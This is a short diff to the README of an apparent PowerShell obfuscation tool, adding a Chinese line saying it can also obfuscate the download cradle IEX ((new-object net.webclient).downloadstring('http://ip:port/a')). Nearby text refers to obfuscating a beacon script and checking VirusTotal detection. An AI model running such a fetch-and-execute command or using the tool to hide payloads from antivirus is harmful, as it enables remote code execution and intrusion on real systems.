@@ -72,6 +72,8 @@ The result can be found in bypass.ps1.
 
 Take beacon.ps1 as an example
 
+同样可以来混淆 IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))
+
 混淆前VT如下：
 
 ![image](https://github.com/H4de5-7/powershell-obfuscation/blob/main/VTorigin.png)
